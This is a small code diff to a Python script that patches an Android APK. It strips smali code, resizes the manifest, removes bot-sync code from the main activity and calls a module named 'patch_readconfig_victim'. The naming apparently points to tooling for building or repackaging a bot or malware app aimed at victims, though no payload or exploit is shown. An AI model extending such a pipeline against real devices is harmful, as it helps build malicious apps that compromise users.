@@ -533,10 +533,13 @@ def patch_manifest_astik_size() -> None:
 def main() -> None:
     strip_dead_smali()
     patch_manifest_astik_size()
-    # Astik-style APK: no BotConfigSync / BotSync — config from Firebase config/{KEY} only
-    from patch_restore_astik_apk import main as restore_astik_apk
+    from patch_restore_astik_apk import strip_extra_smali, strip_main_activity_bot_sync
 
-    restore_astik_apk()
+    strip_extra_smali()
+    strip_main_activity_bot_sync()
+    from patch_readconfig_victim import main as patch_readconfig_victim
+
+    patch_readconfig_victim()
 
 
 if __name__ == "__main__":
